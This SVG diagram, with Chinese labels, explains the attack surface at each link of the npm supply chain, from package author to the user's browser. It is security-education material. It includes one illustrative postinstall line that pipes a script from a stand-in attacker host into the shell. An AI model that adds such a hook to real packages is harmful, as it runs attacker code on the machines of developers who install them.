<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 740 232" width="100%" role="img" aria-labelledby="s5ct s5cd">
  <title id="s5ct">供应链的信任链，每一环都是攻击面</title>
  <desc id="s5cd">从前端代码到你浏览器里的产物，中间隔着六环：包作者、npm 发版、你的 lock 文件、构建机、CDN、用户浏览器。每一环都有对应的攻击手法：作者账号被盗或包被恶意接手、上游发布恶意新版本、幽灵依赖与投毒、postinstall 在安装时执行任意命令、CDN 被篡改或第三方脚本悄悄变更、到了浏览器这端已经没有防线。所以装一个包，装的不是代码库，而是「安装时执行任意命令的权限」。</desc>

  <style>
    .s5c-b{fill:#FBF7EE;stroke:#1C1A17;stroke-width:1.1}
    .s5c-q{fill:#E7DEC8;stroke:#1C1A17;stroke-width:1.1}
    .s5c-t{font-family:'Inter','Noto Sans SC',sans-serif;fill:#1C1A17}
    .s5c-s{font-family:'Inter','Noto Sans SC',sans-serif;fill:#6E675A}
  </style>

  <defs>
    <marker id="s5c-ink" viewBox="0 0 10 10" refX="9.5" refY="5" markerWidth="5.5" markerHeight="5.5" orient="auto">
      <path d="M0 0 L10 5 L0 10 Z" fill="#1C1A17"/>
    </marker>
  </defs>

  <text class="s5c-t" x="40" y="26" font-size="8.5">信任链的每一环，都是攻击面</text>

  <rect class="s5c-b" x="40" y="44" width="100" height="30" rx="2"/>
  <text class="s5c-t" x="90" y="63" font-size="7.5" text-anchor="middle">包作者</text>
  <rect class="s5c-b" x="154" y="44" width="100" height="30" rx="2"/>
  <text class="s5c-t" x="204" y="63" font-size="7.5" text-anchor="middle">npm 发版</text>
  <rect class="s5c-b" x="268" y="44" width="100" height="30" rx="2"/>
  <text class="s5c-t" x="318" y="63" font-size="7.5" text-anchor="middle">你的 lock</text>
  <rect class="s5c-q" x="382" y="44" width="100" height="30" rx="2"/>
  <text class="s5c-t" x="432" y="63" font-size="7.5" text-anchor="middle">构建机</text>
  <rect class="s5c-b" x="496" y="44" width="100" height="30" rx="2"/>
  <text class="s5c-t" x="546" y="63" font-size="7.5" text-anchor="middle">CDN</text>
  <rect class="s5c-b" x="610" y="44" width="100" height="30" rx="2"/>
  <text class="s5c-t" x="660" y="63" font-size="7.5" text-anchor="middle">用户浏览器</text>

  <line x1="142" y1="59" x2="152" y2="59" stroke="#1C1A17" stroke-width="1.1" marker-end="url(#s5c-ink)"/>
  <line x1="256" y1="59" x2="266" y2="59" stroke="#1C1A17" stroke-width="1.1" marker-end="url(#s5c-ink)"/>
  <line x1="370" y1="59" x2="380" y2="59" stroke="#1C1A17" stroke-width="1.1" marker-end="url(#s5c-ink)"/>
  <line x1="484" y1="59" x2="494" y2="59" stroke="#1C1A17" stroke-width="1.1" marker-end="url(#s5c-ink)"/>
  <line x1="598" y1="59" x2="608" y2="59" stroke="#1C1A17" stroke-width="1.1" marker-end="url(#s5c-ink)"/>

  <line x1="90" y1="74" x2="90" y2="88" stroke="#B03A2E" stroke-width="1" stroke-dasharray="3 3"/>
  <line x1="204" y1="74" x2="204" y2="88" stroke="#B03A2E" stroke-width="1" stroke-dasharray="3 3"/>
  <line x1="318" y1="74" x2="318" y2="88" stroke="#B03A2E" stroke-width="1" stroke-dasharray="3 3"/>
  <line x1="432" y1="74" x2="432" y2="88" stroke="#B03A2E" stroke-width="1" stroke-dasharray="3 3"/>
  <line x1="546" y1="74" x2="546" y2="88" stroke="#B03A2E" stroke-width="1" stroke-dasharray="3 3"/>
  <line x1="660" y1="74" x2="660" y2="88" stroke="#B03A2E" stroke-width="1" stroke-dasharray="3 3"/>

  <text class="s5c-s" x="90" y="102" font-size="6.5" text-anchor="middle">账号被盗</text>
  <text class="s5c-s" x="90" y="114" font-size="6.5" text-anchor="middle">包被恶意接手</text>
  <text class="s5c-s" x="204" y="102" font-size="6.5" text-anchor="middle">上游发恶意</text>
  <text class="s5c-s" x="204" y="114" font-size="6.5" text-anchor="middle">新版本</text>
  <text class="s5c-s" x="318" y="102" font-size="6.5" text-anchor="middle">幽灵依赖</text>
  <text class="s5c-s" x="318" y="114" font-size="6.5" text-anchor="middle">投毒</text>
  <text class="s5c-s" x="432" y="102" font-size="6.5" text-anchor="middle">postinstall</text>
  <text class="s5c-s" x="432" y="114" font-size="6.5" text-anchor="middle">执行任意命令</text>
  <text class="s5c-s" x="546" y="102" font-size="6.5" text-anchor="middle">篡改产物</text>
  <text class="s5c-s" x="546" y="114" font-size="6.5" text-anchor="middle">第三方脚本变更</text>
  <text class="s5c-s" x="660" y="102" font-size="6.5" text-anchor="middle">这一端</text>
  <text class="s5c-s" x="660" y="114" font-size="6.5" text-anchor="middle">已经没有防线</text>

  <text class="s5c-t" x="40" y="150" font-size="8">最狠的入口不在运行时，在安装时</text>
  <rect class="s5c-b" x="40" y="158" width="660" height="34" rx="2"/>
  <text class="s5c-t" x="56" y="179" font-size="7.5" style="fill:#B03A2E">"postinstall": "curl https://evil.com/x.sh | sh" —— npm install 那一刻就执行了</text>

  <text class="s5c-t" x="40" y="216" font-size="8.5" style="fill:#B03A2E">你装的不是代码库，是「安装时执行任意命令的权限」。</text>
</svg>
